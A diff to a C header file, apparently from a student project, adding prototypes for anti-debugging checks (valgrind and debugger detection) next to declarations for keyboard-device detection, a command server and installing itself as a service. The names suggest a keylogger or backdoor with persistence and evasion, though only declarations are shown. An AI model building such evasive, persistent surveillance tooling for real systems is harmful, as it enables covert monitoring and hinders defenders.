@@ -106,7 +106,6 @@ typedef struct s_server {
 	fd_set		wfds;
 }	t_server;
 
-
 int		handle_input(t_server *server, int index, char *buffer);
 void	handle_handshake(t_server *server, int index, char *input);
 int		handle_commands(t_server *server, int index, char *input);
@@ -128,6 +127,10 @@ int hasAbsoluteMovement(int fd);
 int hasSpecificKeys(int fd, int *keys, size_t num_keys);
 int keyboardFound(char *path, int *keyboard_fd);
 
+/* stealth.c */
+int	is_valgrind_running();
+int	is_debugger_attached();
+
 /* service.c */
 void	create_service(void);
 void	start_service(void);
@@ -139,6 +142,7 @@ void	ft_server(t_server *server);
 int	find_own_path(char *buffer, size_t size_buffer);
 
 /* utils/utils.c */
+char	*ft_strnstr(const char *haystack, const char *needle, size_t len);
 char	*ft_strtrim(char const *s1, char const *set);
 void	simple_deterministic_id(const uint8_t *input_data, size_t input_len, char *output);
 char	*gen_random_password(void);
